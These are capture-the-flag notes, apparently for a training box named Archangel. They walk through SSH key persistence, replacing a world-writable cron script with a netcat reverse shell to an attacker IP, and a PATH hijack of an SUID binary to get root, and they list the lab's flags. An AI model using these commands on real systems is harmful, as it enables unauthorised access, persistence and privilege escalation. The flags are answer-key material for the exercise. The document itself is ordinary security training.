### New Usable SSH Pub Keys

> add to ~/.ssh/authorized_keys


User
```
echo -e "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCvzTzI1BzEXSTMwsCfzz/Pb8bldsBjY1yf2LdVvHVykRdNqEdsIuLECkxfqPpQKYI5YviSqgLFgogUJJyiIBtVkhhio2GbvhsQBJSFcG5cosRY87Ka2XYwRHKD/JDCaX7IBrzV1QbhM39w72raoPUbMkirf49ah6Vnk4dRMHxWmIH0okSSgRpGiewjz5y28wu8CY5ysEiARLkC8ROuGenNl4S1T4WnAaRF3hZURXwz0x5Q6ZWw0kZBSEsqQNaUpuNowYMkwXIb95ph6+1EaQxsdpETRX4fwGJqiHa1uNBn+l0ORfdEkT1K2EwzOCp+SNWfLrGWxZCnugh8SOAb7Iiz/EZwuZRXkq549ce2AboyK/ppadZUwTKTMJM2NHm1Ky7A9/hgE/voBdlWHsGtPDN7/bEvgCLZtUDrZMGqeEDmyU4h4cMND17JconsugcMAMVfMN4UladFLxSZq7qU01IrYfxreejx7pITgLru8+Kvb6cCQ7s7woAUQRrJmxyIv8vDs707pDy210ANjTgS1UUxKpwrZuXunfpmMKoUmzXxcW3DVi1d4+sSr7QL83cNRB5QbJ6OJTKA5xjmIjvAsxL8WMnQl5+C/01vkbkt57EEFN4s0Bs+WiMFxkhUMUcrIbX9yoie9aaFekpuhTFh7RtpT1u2ScDpjXEsN6qHikOnbQ== your_email@example.com" >> /home/archangel/.ssh/authorized_keys

```

Root
```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/bA08F8Zk1yQaToDydLQtWPoU+/kvs6v7P+NWYpu6pIHRJpaeXne+46ifU0QIS9heChaqzJAz/UsWsDlZ14nCza7ioMal87eoqkAPRbvKdSE6s8eOiNRK9+qVNCXrjwF/NO93+BbEsIMWnsYfjWtxyG9horVtnpaLZmd7MS3GKd+8jW7IPVWAR8rL1wU0AyerK8KJws9L76f8I1/0dOk1z7S13zO6kbl6yWgmbBXhx1WRj7nLaj4IMKUzGakDCKgFGcxsXopNSXSUEFjqqp+VDZeakNWUy4LX0Oa9Yz5Oosz42oTVT8W6kefQDnTcwGMkz9QgRr1jdW5uE7l60wiuGM5rg0oR2AL1VZyMP9yDEObAyNZZJ1Uoor26I0eAO5V424IiyxYo12cqA0uPLZUHGkxJtIX6YgkYmyxVpXS1YKmvKECAU17gAfjTgzR/MwTGKi20oTkuqyjljN8QUVjCaA8QTrU59qwzasTTO845ge/7VeADBZRGwFD+VaJBO5F9TabXsUIrTVJUPXtSFOWJ0yxmR/CGmuqZrIuQLG54bUWrig1sDAC/HVd1wCf1rgVCmO6HhmGTJsKmWcIAjdjYsZJBM9AGE4PelIYHQxvUihScv7gCYlSjdsZjE6HI9EaE3fWn6aS5jHgtGm/SjflIVm6vHSIEZjOmG+Pne2vyxQ== your_email@example.com" >> /root/.ssh/authorized_keys
```


/etc/crontab

```
# m h dom mon dow user	command
*/1 *   * * *   archangel /opt/helloworld.sh
```

we can read and write as www-data

```
-rwxrwxrwx 1 archangel archangel 66 Nov 20  2020 /opt/helloworld.sh
```


start another listener on your attacker machine 

```
nc -lvnp 1338
```

command to edit helloworld.sh with a new reverse shell

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.6.24.127 1338 >/tmp/f" > /opt/helloworld.sh
```

after about a minute, we get a hit

```
listening on [any] 1338 ...
connect to [10.6.24.127] from (UNKNOWN) [10.10.93.86] 57230
sh: 0: can't access tty; job control turned off
$ whoami
archangel
$ uname -a
Linux ubuntu 4.15.0-123-generic #126-Ubuntu SMP Wed Oct 21 09:40:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

upgrade the shell

```
python3 -c 'import pty; pty.spawn("/bin/bash");'
```


try ssh persistence

```
mkdir /home/archangel/.ssh
```

```
echo -e "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCvzTzI1BzEXSTMwsCfzz/Pb8bldsBjY1yf2LdVvHVykRdNqEdsIuLECkxfqPpQKYI5YviSqgLFgogUJJyiIBtVkhhio2GbvhsQBJSFcG5cosRY87Ka2XYwRHKD/JDCaX7IBrzV1QbhM39w72raoPUbMkirf49ah6Vnk4dRMHxWmIH0okSSgRpGiewjz5y28wu8CY5ysEiARLkC8ROuGenNl4S1T4WnAaRF3hZURXwz0x5Q6ZWw0kZBSEsqQNaUpuNowYMkwXIb95ph6+1EaQxsdpETRX4fwGJqiHa1uNBn+l0ORfdEkT1K2EwzOCp+SNWfLrGWxZCnugh8SOAb7Iiz/EZwuZRXkq549ce2AboyK/ppadZUwTKTMJM2NHm1Ky7A9/hgE/voBdlWHsGtPDN7/bEvgCLZtUDrZMGqeEDmyU4h4cMND17JconsugcMAMVfMN4UladFLxSZq7qU01IrYfxreejx7pITgLru8+Kvb6cCQ7s7woAUQRrJmxyIv8vDs707pDy210ANjTgS1UUxKpwrZuXunfpmMKoUmzXxcW3DVi1d4+sSr7QL83cNRB5QbJ6OJTKA5xjmIjvAsxL8WMnQl5+C/01vkbkt57EEFN4s0Bs+WiMFxkhUMUcrIbX9yoie9aaFekpuhTFh7RtpT1u2ScDpjXEsN6qHikOnbQ== your_email@example.com" >> /home/archangel/.ssh/authorized_keys
```

```
ssh -i archangel_persis.rsa archangel@10.10.93.86
```

got ssh persistence

/home/archangel/user.txt

```
thm{lf1_t0_rc3_1s_tr1cky}
```

/home/archangel/secret/user2.txt

```
thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}
```


```
strings /home/archangel/secret/backup
```

```
cp /home/user/archangel/myfiles/* /opt/backupfiles
```

nothing its a rickroll

however /home/archangel/secret/backup is an SUID file

```
-rwsr-xr-x 1 root root 16904 Nov 18  2020 /home/archangel/secret/backup
```

trying to run it

```
/home/archangel/secret/backup
```

```
cp: cannot stat '/home/user/archangel/myfiles/*': No such file or directory
```

there is no /home/user directory... maybe we can take advantage of this

can't create a directory in home, maybe try changing the path for the *cp* file, we can make our own *cp* in a different directory

```
cd /dev/shm
touch cp
echo "/bin/bash -p" > cp
chmod 777 cp
export PATH=/dev/shm:$PATH
/home/archangel/secret/backup
```


we get a root shell

```
root@ubuntu:/dev/shm# whoami
root
root@ubuntu:/dev/shm# uname -a
Linux ubuntu 4.15.0-123-generic #126-Ubuntu SMP Wed Oct 21 09:40:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
root@ubuntu:/dev/shm# sudo -l
Matching Defaults entries for root on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User root may run the following commands on ubuntu:
    (ALL : ALL) ALL
root@ubuntu:/dev/shm#
```

/root/root.txt

```
thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}
```

